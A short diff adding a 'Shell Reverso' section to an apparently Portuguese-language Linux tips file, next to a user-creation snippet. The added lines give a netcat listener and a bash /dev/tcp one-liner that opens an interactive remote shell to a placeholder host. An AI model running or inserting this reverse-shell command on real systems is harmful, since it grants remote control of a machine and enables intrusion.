@@ -2824,6 +2824,19 @@ useradd -c automaticUser -m -k/dev/null -s /bin/bash $USER
 echo "$USER:$PWD" | chpasswd ---crypt-method SHA512 $USER
 ```
 
+### Shell Reverso
+
+- Cliente
+```
+nc -lp 3000
+```
+
+- Servidor
+```
+bash -i > /dev/tcp/ip-servidor/3000 0>&1
+
+```
+
 # Geral
 <a href="#Dicas-ng">`^`</a>
 
